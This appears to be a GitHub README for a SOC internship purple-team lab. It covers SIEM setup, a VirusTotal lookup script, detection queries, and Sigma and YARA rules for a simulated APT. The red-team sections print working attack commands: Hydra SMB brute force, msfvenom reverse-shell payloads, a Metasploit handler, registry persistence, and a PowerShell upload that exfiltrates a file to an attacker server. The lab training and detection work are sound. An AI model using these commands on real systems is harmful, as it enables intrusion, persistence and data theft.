SOC Analyst Internship Project: Red Team Attack Surface and Blue Team Automation & Threat Detection overall  a Purple Teaming

## 📊 Project Overview

This repository documents my hands-on experience during the Null Class
SOC Analyst Tier 2 internship, where I developed practical cybersecurity
skills through a comprehensive simulation of real-world security
operations. The project demonstrates a dual perspective approach,
covering both offensive (Red Team) and defensive (Blue Team) operations
within a controlled lab environment.

The project focuses on three critical cybersecurity domains:

-   **SOC Automation**: Developing Python scripts to streamline log
    > ingestion and threat intelligence lookups

-   **Threat Detection**: Creating custom correlation rules in SIEM for
    > identifying sophisticated attack techniques

-   **Incident Response**: Simulating and responding to multi-stage APT
    > attacks using open-source SOC tools

By implementing these tasks, I gained valuable experience in the
complete cybersecurity lifecycle---from attack simulation to detection,
investigation, and mitigation---while working with industry-standard
tools and following the MITRE ATT&CK framework.

## 💻 Lab Environment Setup

I created a controlled lab environment to safely simulate real-world
cyberattacks and defensive operations. The infrastructure consists of:

### 🖥️ Host System

-   **Kali Linux**: Primary operating system used for attack simulation,
    > payload generation, and monitoring

### ⚙️ Virtualization

-   **VirtualBox**: Used to virtualize and manage multiple virtual
    > machines

### 🖥️ Virtual Machines

  -----------------------------------------------------------------------
  VM                      Purpose                 Key Details
  ----------------------- ----------------------- -----------------------
  **Kali Linux VM**       Attacker machine        Metasploit, Hydra,
                                                  Iodine, and other
                                                  penetration testing
                                                  tools

  **Windows 10 VM**       Primary target          Payload execution,
                                                  persistence, privilege
                                                  escalation, data
                                                  exfiltration

  **Windows 7 VM**        Secondary target        Lateral movement
                                                  testing, credential
                                                  exploitation
                                                  
  -----------------------------------------------------------------------

### 🐳 Containerized SIEM Stack

Deployed using Docker containers orchestrated with docker-compose.yml:

version: \'3.8\'\
services:\
elasticsearch:\
image: docker.elastic.co/elasticsearch/elasticsearch:8.8.0\
environment:\
- discovery.type=single-node\
ports:\
- \"9200:9200\"\
volumes:\
- esdata:/usr/share/elasticsearch/data\
\
kibana:\
image: docker.elastic.co/kibana/kibana:8.8.0\
depends_on:\
- elasticsearch\
ports:\
- \"5601:5601\"\
environment:\
- ELASTICSEARCH_HOSTS=http://elasticsearch:9200\
\
wazuh:\
image: wazuh/wazuh-manager:4.5.0\
ports:\
- \"1514:1514/udp\"\
- \"1515:1515/tcp\"\
- \"55000:55000/tcp\"\
\
thehive:\
image: thehiveproject/thehive4:4.2.0\
depends_on:\
- elasticsearch\
ports:\
- \"9000:9000\"\
\
cortex:\
image: thehiveproject/cortex:3.1.0\
ports:\
- \"9001:9001\"\
\
volumes:\
esdata:

This containerized stack provided seamless integration for:

-   Log collection and analysis (Elasticsearch, Kibana)

-   Endpoint monitoring (Wazuh)

-   Incident tracking and case management (TheHive, Cortex)

The network configuration enabled realistic attack simulation while
maintaining isolation for safe testing.

## 🤖 Task 1: SOC Workflow Automation

### Objective

Develop a Python script to automate SOC workflows for log ingestion and
threat intelligence lookup using APIs (VirusTotal).

### Implementation

I created a script that performs two critical SOC workflows:

#### 1️⃣ Log Ingestion

-   Reads sample web access logs from access.log

-   Extracts unique IP addresses using regex pattern matching

-   Handles various log formats for reliable data extraction

#### 2️⃣ Threat Intelligence Lookup

-   Integrates with VirusTotal API to query IP reputation

-   Identifies malicious IPs based on security vendor reports

-   Generates actionable output for security analysts

### 📜 Code Snippet

import re\
import requests\
\
\# ===== CONFIG =====\
VIRUSTOTAL_API_KEY = \"YOUR_API_KEY\"\
LOG_FILE = \"access.log\"\
\
\# ===== FUNCTIONS =====\
def read_logs(file_path):\
\"\"\"Read and return log lines from a file.\"\"\"\
with open(file_path, \'r\') as file:\
return file.readlines()\
\
def extract_ips(log_lines):\
\"\"\"Extract IP addresses from log lines using regex.\"\"\"\
ip_pattern = r\'\\b(?:\[0-9\]{1,3}\\.){3}\[0-9\]{1,3}\\b\'\
ips = set(re.findall(ip_pattern, \"\\n\".join(log_lines)))\
return list(ips)\
\
def vt_ip_lookup(ip):\
\"\"\"Query VirusTotal for IP reputation.\"\"\"\
url =
f\"\[https://www.virustotal.com/api/v3/ip_addresses/{ip}\]
headers = {\
\"x-apikey\": VIRUSTOTAL_API_KEY\
}\
response = requests.get(url, headers=headers)\
if response.status_code == 200:\
data = response.json()\
malicious_count =
data\[\"data\"\]\[\"attributes\"\]\[\"last_analysis_stats\"\]\[\"malicious\"\]\
return malicious_count\
else:\
return None\
\
\# ===== MAIN SCRIPT =====\
if \_\_name\_\_ == \"\_\_main\_\_\":\
print(\"\[\*\] Reading logs\...\")\
logs = read_logs(LOG_FILE)\
\
print(\"\[\*\] Extracting IP addresses\...\")\
ip_list = extract_ips(logs)\
print(f\"\[+\] Found {len(ip_list)} unique IPs\")\
\
print(\"\[\*\] Checking IPs on VirusTotal\...\")\
for ip in ip_list:\
malicious = vt_ip_lookup(ip)\
if malicious is not None:\
print(f\"{ip} → Malicious Reports: {malicious}\")\
else:\
print(f\"{ip} → Lookup failed.\")

### 🔍 How to Use

1.  **Prerequisites**:

    -   Python 3.9+

    -   Requests library (pip install requests)

2.  **Setup**:

    -   Obtain a VirusTotal API key (free tier available)

    -   Replace YOUR_API_KEY with your actual API key

    -   Place your log file as access.log in the working directory

3.  **Execution**:\
    > python soc_automation.py

### 💡 Challenges & Solutions

-   **Challenge**: Handling multiple log entries with varying formats

    -   **Solution**: Used robust regex patterns to extract IP addresses
        > reliably

-   **Challenge**: VirusTotal API rate limits (4 requests/minute on free
    > tier)

    -   **Solution**: Implemented sequential processing with error
        > handling and provided instructions for API key management

### 📊 Evidence

*Sample output showing malicious IP reports from VirusTotal*

This automation reduces manual effort in threat identification and
enables security teams to focus on high-priority incidents.

## 🔍 Task 2: Custom Correlation Rules in SIEM

### Objective

Develop and test custom correlation rules in ELK Stack to detect
credential stuffing, DNS tunneling, and PowerShell exploitation.

### Implementation

#### 🔐 Credential Stuffing Detection

-   **Simulation**: Used Hydra to perform credential stuffing against
    > SMB service on Windows 7\
    > hydra -L users.txt -P rockyou.txt 192.168.31.163 smb

-   **Detection Logic**:

    -   Rule triggers on multiple failed authentication attempts from a
        > single IP within a short timeframe

    -   Threshold: \>5 failed attempts in 1 minute

-   **Kibana Query**:\
    > event.dataset:smb AND event.action:authentication_failed AND
    > source.ip:192.168.31.8

#### 📡 DNS Tunneling Detection

-   **Simulation**:

    -   Installed iodine to establish DNS tunnel between Kali and
        > Windows systems

    -   Generated traffic using ping commands through the tunnel

    -   Captured traffic with tcpdump and converted to JSON

-   **Detection Logic**:

    -   Identifies abnormally long DNS query lengths (256+ bytes)

    -   Detects high frequency of DNS requests to single domain

    -   Recognizes base64-like encoded patterns in query data

-   **Kibana Query**:\
    > dns.question.length:\>250 AND
    > dns.question.name:/\[a-zA-Z0-9\]{30,}\\.example\\.com/

#### 💻 PowerShell Exploitation Detection

-   **Simulation**:

    -   Enabled PowerShell Remoting between Windows 10 and Windows 7

    -   Used Invoke-Command and Enter-PSSession for lateral movement

    -   Executed obfuscated Base64 commands

-   **Detection Logic**:

    -   Identifies suspicious PowerShell command-line patterns

    -   Detects encodedcommand parameters

    -   Flags unusual parent processes launching PowerShell

-   **Kibana Query**:\
    > process.name:powershell.exe AND
    > process.command_line:\*EncodedCommand\*

### 📊 Evidence

#### Credential Stuffing Detection

*ELK Stack visualization showing multiple failed SMB login attempts*

#### DNS Tunneling Detection

*DNS tunneling logs showing abnormal query lengths (256, 512, and 1024
bytes)*

#### PowerShell Exploitation

*Kibana logs confirming PowerShell data exfiltration via
Invoke-WebRequest*

### 💡 Key Learnings

1.  **Detection Tuning**: Initially missed successful login events after
    > brute-force attempts, highlighting the need for rules that track
    > both failed AND successful authentications

2.  **Noise Reduction**: DNS tunneling detection required filtering out
    > legitimate DNS traffic to reduce false positives

3.  **Behavioral Analysis**: PowerShell detection is most effective when
    > focusing on command-line patterns rather than just process
    > execution

4.  **Rule Effectiveness**: Well-crafted correlation rules can detect
    > attacks even when individual events appear benign

## 🕵️ Task 3: Multi-Stage APT Simulation

### Objective

Simulate and respond to a multi-stage APT attack using open-source SOC
tools, covering attack simulation, detection, investigation, and
mitigation.

### Phase 1: Attack Simulation (Red Team)

#### 🔓 Initial Access

-   Generated payload using Metasploit:\
    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.163
    > LPORT=4444 -f exe -o payload.exe

-   Delivered payload via phishing simulation to Windows 10 target

#### ⬆️ Privilege Escalation & Persistence

-   Used Meterpreter getsystem command for privilege escalation

-   Created registry run key for persistence:\
    > reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v
    > payload /t REG_SZ /d \"C:\\Users\\Public\\payload.exe\"

-   Established scheduled tasks for additional persistence mechanisms

#### ↔️ Lateral Movement

-   Initially attempted PsExec but encountered issues

-   Successfully used EternalBlue vulnerability to compromise Windows 7

-   Achieved cross-session movement between Windows 10 and Windows 7

#### 📤 Data Exfiltration

-   Created Python HTTP server for data collection:\
    > python3 -m http.server 8080

-   Used PowerShell for exfiltration:\
    > Invoke-WebRequest -Uri
    > \[http://192.168.31.163:8080/upload\]
    > -Method POST -InFile important_data.txt

### Phase 2: Attack Detection & Investigation (Blue Team)

#### 🔍 Detection Mechanisms

-   **Wazuh Alerts**: Triggered on suspicious process execution

-   **Kibana Queries**: Identified malicious PowerShell activity

-   **Security Onion**: Detected network anomalies during lateral
    > movement

-   **TheHive & Cortex**: Enriched IOCs and facilitated investigation

#### 🕰️ Attack Timeline Reconstruction

1.  **Initial Access** (Aug 03, 2025, 11:45-12:00)

    -   Payload execution from Downloads folder

    -   Meterpreter session established

2.  **Privilege Escalation** (Aug 03, 2025, 11:45-12:00)

    -   getsystem command execution

    -   Credential dumping with hashdump

3.  **Lateral Movement** (Aug 03, 2025, 12:15-12:30)

    -   EternalBlue exploitation of Windows 7

    -   Cross-session movement achieved

4.  **Data Exfiltration** (Aug 06, 2025, 13:50-14:10)

    -   PowerShell Invoke-WebRequest to attacker server

    -   Sensitive data successfully exfiltrated

### Phase 3: Threat Intelligence & Mitigation

#### 🔍 IOC Extraction & Sharing

-   Extracted critical IOCs:

    -   Malicious file hash:
        > a78acea453c68a684917b967162a599f9881eba69471c202c071b86e72066037

    -   C2 IP: 192.168.31.163

    -   Payload name: payload.exe

-   Shared IOCs via MISP for broader threat intelligence sharing

#### 📜 Sigma Rule Creation

title: Multi-Stage Attack Detection on desktop-bkfj38l\
id: e8f1c1d9-3b6f-4c8a-99f6-0a94b7a1d123\
status: stable\
description: \|\
Detects multi-stage attack on host desktop-bkfj38l involving:\
1. Initial access and payload.exe execution from Downloads folder via
scheduled tasks (Win event ID 4698),\
2. Persistence creation through scheduled tasks and registry Run key
modifications referencing payload.exe,\
3. Privilege escalation with Meterpreter payload injection, getsystem
command, and hashdump activity (Win event IDs 1, 4672),\
4. Data exfiltration via PowerShell Invoke-WebRequest sending data to
suspicious external URL.\
author: Piyush Singh\
date: 2025-08-09\
references:

[https://attack.mitre.org/techniques/T1053/005/\]
[https://attack.mitre.org/techniques/T1547/001/\]
[https://attack.mitre.org/techniques/T1078/\]
[https://attack.mitre.org/techniques/T1003/\]
[https://attack.mitre.org/techniques/T1041/\]
logsource:\
product: windows\
service: security\
detection:\
selection_scheduled_task_creation:\
winlog.event_id: 4698\
host.name: desktop-bkfj38l\
process.command_line\|contains: \"payload.exe\"\
\'@timestamp\|gte\': \"2024-08-01T14:20:00\"\
\'@timestamp\|lte\': \"2024-08-01T14:40:00\"\
\# Additional detection sections for persistence, privilege escalation,
and exfiltration\
condition: selection_scheduled_task_creation or
selection_registry_persistence or selection_meterpreter_injection or
selection_privilege_escalation or selection_data_exfiltration\
level: high\
tags:\
- attack.initial_access\
- attack.persistence\
- attack.privilege_escalation\
- attack.exfiltration\
- mitre.t1053.005\
- mitre.t1547.001\
- mitre.t1078\
- mitre.t1003\
- mitre.t1041

#### 🔍 YARA Rule Creation

rule Payload_DesktopBKFJ38L_MultiStageAttack {\
meta:\
description = \"Detects malicious payload.exe used in multi-stage attack
on Windows 10 host desktop-bkfj38l\"\
author = \"Piyush Singh\"\
date = \"2025-08-10\"\
md5 = \"b8e65d5320b676741a7d3988904ffe75\"\
sha1 = \"7f6436096fa1df98059a96e796d3a212ba3c6926\"\
sha256 =
\"a78acea453c68a684917b967162a599f9881eba69471c202c071b86e72066037\"\
file_size = \"73802 bytes\"\
\
strings:\
\$s1 = \"!This program cannot be run in DOS mode.\"\
\$s2 = \"\`.rdata\"\
\$s3 = \"@.data\"\
\$s4 = \"@2P7DF\"\
\$s5 = \"@\<ALhK\"\
\
condition:\
filesize == 73802 and\
(all of (\$s\*) or\
hash.md5(0, filesize) == \"b8e65d5320b676741a7d3988904ffe75\")\
}

#### 🛡️ Mitigation Strategies

1.  **Endpoint Protection**

    -   Implemented application allowlisting to block unauthorized
        > executables

    -   Restricted PowerShell execution policies

2.  **Access Controls**

    -   Enforced principle of least privilege

    -   Removed unnecessary admin rights

    -   Implemented strong password policies

3.  **Network Security**

    -   Deployed network segmentation

    -   Restricted SMB access between workstations

    -   Implemented egress filtering

4.  **Detection Enhancements**

    -   Integrated Sigma rules into Wazuh

    -   Added YARA rules to endpoint scanning

    -   Created automated alert enrichment workflows

### 📊 Evidence

*Initial access and privilege escalation on Windows 10*

*Kibana logs showing detection of PowerShell data exfiltration*

*Custom Sigma rule for multi-stage attack detection*

## 🛠️ Tools and Technologies

  --------------------------------------------------------------------------
  Tool              Category          Purpose            Key Features
  ----------------- ----------------- ------------------ -------------------
  **Metasploit**    Red Team          Exploitation       Payload generation,
                                      framework          session management,
                                                         post-exploitation

  **Hydra**         Red Team          Password cracking  Credential stuffing
                                                         against network
                                                         services

  **Iodine**        Red Team          DNS tunneling      Covert data
                                                         exfiltration via
                                                         DNS

  **ELK Stack**     Blue Team         Log analysis       Centralized
                                                         logging,
                                                         visualization,
                                                         correlation

  **Wazuh**         Blue Team         SIEM/HIDS          Real-time
                                                         monitoring,
                                                         rule-based
                                                         detection

  **Security        Blue Team         Network monitoring IDS/IPS, network
  Onion**                                                analysis, packet
                                                         capture

  **TheHive**       Blue Team         Case management    Incident tracking,
                                                         collaboration

  **Cortex**        Blue Team         Analysis engine    IOC enrichment,
                                                         automated analysis

  **MISP**          Both              Threat             IOC sharing, threat
                                      intelligence       intelligence
                                                         platform

  **Sigma**         Both              Detection rules    Generic signature
                                                         format for log
                                                         events

  **YARA**          Both              Malware            Pattern matching
                                      identification     for malware
                                                         identification

  **VirtualBox**    Both              Virtualization     VM management for
                                                         lab environment

  **Docker**        Both              Containerization   SIEM stack
                                                         deployment, service
                                                         isolation
  --------------------------------------------------------------------------

## 🧪 Project Setup and Reproduction

### Prerequisites

-   16+ GB RAM (for running multiple VMs simultaneously)

-   50+ GB free disk space

-   VirtualBox 6.1+

-   Docker 20.10+

-   Python 3.9+

### Step-by-Step Setup

#### 1️⃣ Host System Setup

\# Install VirtualBox and extensions\
sudo apt update\
sudo apt install virtualbox virtualbox-ext-pack\
\
\# Install Docker\
sudo apt install docker.io docker-compose\
sudo systemctl enable \--now docker

#### 2️⃣ Virtual Machine Configuration

1.  Download Windows 10 and Windows 7 ISOs

2.  Create VMs in VirtualBox with:

    -   2+ CPU cores each

    -   2-4 GB RAM each

    -   30+ GB disk space each

3.  Install Windows with default settings

4.  Enable PowerShell Remoting on Windows targets:\
    > Enable-PSRemoting -Force\
    > Set-NetFirewallRule -Name WINRM-HTTP-In-TCP-PUBLIC -RemoteAddress
    > Any

#### 3️⃣ SIEM Stack Deployment

\# Clone repository\
git clone
\[https://github.com/Magnus7811/soc_analyst_tier-2_project.git\](https://github.com/Magnus7811/soc_analyst_tier-2_project.git)\
cd soc_analyst_tier-2_project\
\
\# Start Docker containers\
docker compose up -d\
\
\# Verify services are running\
docker ps

#### 4️⃣ Agent Installation

1.  Install Wazuh agent on Windows targets:

    -   Download from
        > https://packages.wazuh.com/4.x/windows/wazuh-agent-4.5.0-1.msi

    -   During installation, specify manager IP as your Docker host

2.  Configure Winlogbeat on Windows:

    -   Download from https://www.elastic.co/downloads/beats/winlogbeat

    -   Configure winlogbeat.yml with Elasticsearch output

#### 5️⃣ Task Execution

1.  **Task 1**: Run SOC automation script\
    > cd task1\
    > python3 soc_automation.py

2.  **Task 2**: Simulate attacks and verify detection\
    > \# Credential stuffing\
    > hydra -L users.txt -P rockyou.txt TARGET_IP smb\
    > \
    > \# DNS tunneling\
    > iodine -f TARGET_IP example.com

3.  **Task 3**: Execute full APT simulation\
    > \# Generate payload\
    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP
    > LPORT=4444 -f exe -o payload.exe\
    > \
    > \# Start listener\
    > msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD
    > windows/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT
    > 4444; run\"

#### ⚠️ Troubleshooting Tips

-   **Docker issues**: Ensure sufficient memory allocation in Docker
    > settings

-   **Network connectivity**: Verify all VMs are on the same VirtualBox
    > network (Bridged or Host-only)

-   **Wazuh agent connection**: Check firewall settings on Windows
    > targets

-   **Kibana visualization**: Wait 2-5 minutes for logs to propagate
    > through the stack

## 💡 Key Takeaways and Lessons Learned

1.  **Dual Perspective is Critical**: Understanding both attacker and
    > defender mindsets creates more effective security measures.
    > Knowing how attacks work helps build better detection rules.

2.  **Detection Engineering Matters**: Well-crafted correlation rules
    > can identify sophisticated attacks even when individual events
    > appear benign. The quality of detection rules directly impacts SOC
    > effectiveness.

3.  **Log Visibility Gaps Exist**: During Task 2, I discovered that
    > successful login events weren\'t being logged, creating a
    > detection gap. Comprehensive logging requires constant validation.

4.  **Threat Intelligence Integration**: Sharing IOCs via MISP and
    > implementing YARA/Sigma rules creates a proactive defense posture
    > that can prevent similar future attacks.

5.  **Automation is Essential**: The Python script from Task 1
    > demonstrated how automation can free up analyst time for
    > higher-value activities while ensuring consistent processing.

6.  **Attackers Adapt**: When PSExec failed for lateral movement, I
    > successfully used EternalBlue instead. Real attackers will
    > persistently try multiple techniques until they succeed.

7.  **Defense-in-Depth Works**: No single tool provided complete
    > protection. The combination of Wazuh, ELK, Security Onion, and
    > TheHive created overlapping detection capabilities.

## 🔮 Future Improvements

1.  **Complete SOC Workflow Automation**

    -   Implement the third workflow (alert enrichment) to cover all
        > required components

    -   Add integration with additional threat intelligence feeds
        > (AlienVault OTX, MISP)

2.  **Enhanced Detection Rules**

    -   Expand correlation rules to cover more MITRE ATT&CK techniques

    -   Implement machine learning-based anomaly detection for unknown
        > threats

3.  **SOAR Integration**

    -   Automate response actions using TheHive and Cortex playbooks

    -   Create automated containment workflows for common attack
        > scenarios

4.  **Cloud Environment Simulation**

    -   Extend the lab to include cloud environments (AWS/Azure)

    -   Develop detection rules for cloud-specific attack techniques

5.  **Threat Hunting Framework**

    -   Create structured hunting queries based on MITRE ATT&CK
        > framework

    -   Develop a hunting playbook for common adversary tactics

## 📚 References and Resources

-   **MITRE ATT&CK Framework**: https://attack.mitre.org/

-   **Elastic Security Documentation**:
    > https://www.elastic.co/guide/en/security/current/index.html

-   **Wazuh Documentation**: https://documentation.wazuh.com/

-   **TheHive Project**: https://thehive-project.org/

-   **Sigma Rules Repository**: https://github.com/SigmaHQ/sigma

-   **YARA Documentation**: https://yara.readthedocs.io/

-   **VirusTotal API Documentation**:
    > https://developers.virustotal.com/reference

-   **Null Class Internship Guidelines**: Provided during program

\"The best security is done by those who can think like an attacker but
act like a defender.\" - This project embodies that philosophy through
hands-on Red Team/Blue Team exercises that bridge the gap between
theoretical knowledge and practical security operations.

This repository demonstrates my journey through the Null Class SOC
Analyst Tier 2 internship, showcasing practical skills in security
automation, threat detection, and incident response using
industry-standard tools and methodologies.
